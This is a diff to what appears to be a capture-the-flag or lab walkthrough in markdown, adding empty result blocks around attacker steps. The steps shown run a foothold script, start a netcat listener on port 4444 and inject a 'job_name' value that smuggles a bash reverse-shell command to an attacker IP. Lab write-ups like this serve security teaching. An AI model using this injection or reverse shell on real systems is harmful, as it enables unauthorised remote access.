@@ -517,6 +517,12 @@ if __name__ == "__main__":
 
 **Command (attacker, terminal 1):** `python3 foothold.py`
 
+**Result:**
+
+```
+
+```
+
 **Command (attacker, terminal 2):** `nc -lvnp 4444`
 
 **Breakdown:**
@@ -525,9 +531,13 @@ if __name__ == "__main__":
     - **Description:** Netcat listener — `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444` bind port.
     - **Purpose:** Catch the reverse shell the injected `bash -i >& /dev/tcp/...` payload connects back with.
 
-**Payload (the injected `job_name`):**
+**Result:**
 
-python
+```
+
+```
+
+**Payload (the injected `job_name`):**
 
 ```python
 job_name = "'; bash -c 'bash -i >& /dev/tcp/10.10.15.111/4444 0>&1'; #"
